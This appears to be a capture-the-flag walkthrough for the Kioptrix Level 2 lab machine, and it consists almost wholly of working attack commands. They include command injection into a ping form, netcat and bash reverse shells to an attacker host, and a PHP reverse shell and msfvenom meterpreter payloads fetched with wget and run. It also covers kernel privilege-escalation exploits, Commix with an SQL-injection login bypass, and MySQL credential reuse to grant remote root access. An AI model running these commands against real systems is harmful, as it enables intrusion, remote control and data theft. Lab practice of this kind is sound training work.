
### Network Configuration
```
--------------------         ------------------
|                  |---------|     Attacker   |
|      Router      |         |  192.168.50.6  |
|                  |         ------------------
|                  |         ------------------
|   192.168.50.1    ---------|     Victim     |
|                  |         |  192.168.50.3  |
--------------------         ------------------
```
Attacker
```
nc -lvp 5678
```
Victim
```
; /usr/local/bin/nc 192.168.50.6 5678 -e /bin/sh
OR
; bash -i >& /dev/tcp/192.168.50.6/5678 0>&1
```
```
cat /etc/redhat-release
CentOS release 4.5 (Final)

uname -a
Linux kioptrix.level2 2.6.9-55.EL

uname -mrs
Linux 2.6.9-55.EL i686
```
```
# searchsploit centos
# searchsploit 2.6.9
# searchsploit kernel 2.6 linux local | grep "CentOS\ 4"
```
### Method #1
```
ls /usr/share/webshells/
ls /usr/share/webshells/php/

cp /usr/share/webshells/php/php-reverse-shell.php ~

cat php-reverse-shell.php | grep "CHANGE THIS"
```
```
sed -i "s#$ip = '127.0.0.1';#$ip = '192.168.50.6';#" php-reverse-shell.php
sed -i "s#$port = 1234;#$port = 5678;#" php-reverse-shell.php

OR

sed -i "s#$ip = '127.0.0.1';  // CHANGE THIS#$ip = '192.168.50.6';#" php-reverse-shell.php
sed -i "s#$port = 1234;       // CHANGE THIS#$port = 5678;#" php-reverse-shell.php
```
```
cat php-reverse-shell.php | grep -e ^\$ip -e ^\$port

$ip = '192.168.50.6';  // CHANGE THIS
$port = 5678;       // CHANGE THIS
```

Attacker
```
python -m SimpleHTTPServer
```
Victim
```
127.0.0.1; wget -O /tmp/php-reverse-shell.php http://192.168.50.6:8000/php-reverse-shell.php
```
Attacker
```
nc -lnvp 5678
```
Victim
```
127.0.0.1; php /tmp/php-reverse-shell.php

uname -a && whoami
```
--------------------

#### Privilege Escalation
```
cat /etc/redhat-release
CentOS release 4.5 (Final)

uname -a
Linux kioptrix.level2 2.6.9-55.EL
```
```
# searchsploit kernel 2.6 linux local | grep "CentOS\ 4"
```

Attacker
```
cp /usr/share/exploitdb/exploits/linux/local/9545.c ~
OR
cp /usr/share/exploitdb/exploits/linux_x86/local/9542.c ~
```
Attacker
```
python -m SimpleHTTPServer
```
Victim
```
127.0.0.1; wget -O /tmp/php-reverse-shell.php http://192.168.50.6:8000/php-reverse-shell.php
```
Attacker
```
nc -lnvp 5678
```
Victim
```
127.0.0.1; php /tmp/php-reverse-shell.php
```
Victim
```
cd /tmp

wget -O 9545.c http://192.168.50.6:8000/9545.c
OR
wget -O 9542.c http://192.168.50.6:8000/9542.c

gcc 9545.c -o exploit ### OR 9542.c
chmod 755 exploit
./exploit

uname -a && whoami
```
### Method #2

Attacker
```
nc -lvp 5678
```
Victim
```
; /usr/local/bin/nc 192.168.50.6 5678 -e /bin/sh
OR
; bash -i >& /dev/tcp/192.168.50.6/5678 0>&1
```
Attacker
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.50.6 LPORT=4567 -f elf > shell.elf

cp ~/shell.elf /var/www/html

service apache2 start
```
Attacker
```
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LPORT 4567
set LHOST 192.168.50.6
run
```
Victim
```
wget -O /tmp/shell.elf http://192.168.50.6/shell.elf

chmod 777 /tmp/shell.elf
/tmp/shell.elf
```

### Method #3

Attacker
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.50.6 LPORT=5555 -f raw > backdoor.php.txt

cp ~/backdoor.php.txt /var/www/html
```
Attacker
```
use multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.50.6
set LPORT 5555
run
```
Victim
```
; cd /tmp && wget -O bd.php 192.168.50.6/backdoor.php.txt && php -f bd.php
```
Attacker
```
sessions -l

sysinfo

shell

uname -a; cat /etc/*-release; id; w
```
-------------------------

### Commix

https://github.com/commixproject/commix

https://github.com/commixproject/commix/wiki/Usage-Examples
```
apt-get install commix

rm -r /usr/share/commix/.output/*

commix --url="http://192.168.50.3/pingit.php" --data="ip=127.0.0.1&submit=submit" --auth-url="http://192.168.50.3/index.php" --auth-data="uname=%27+OR+1+--+&psw=&btnLogin=Login"

commix --url="http://192.168.50.3/pingit.php" --data="ip=127.0.0.1&submit=submit" --auth-url="http://192.168.50.3/index.php" --auth-data="uname=%27+OR+1+--+&psw=&btnLogin=Login" --file-write="/root/shell.php" --file-dest="/tmp/bd_commix.php" --os-cmd="php -f /tmp/bd_commix.php"
```
--------------------------

### MySQL
```
; cat index.php

; mysql -u john -phiroshima -e "USE mysql; SHOW tables;"
; mysql -u john -phiroshima -e "USE mysql; SELECT * FROM user;"
```
```
mysql -h 192.168.50.3 -u root
```
```
nmap 192.168.50.3 -sV -p 3306
```
```
; mysql -u root -phiroshima -e "USE mysql; GRANT ALL PRIVILEGES ON *.* TO 'root'@'192.168.50.6';"
```
```
nmap 192.168.50.3 -sV -p 3306
```
```
mysql -h 192.168.50.3 -u root

SHOW databases;
USE webapp; SHOW tables;
SELECT * FROM users;
```
```
find / -name ".mysql_history"

cat /root/.mysql_history
```

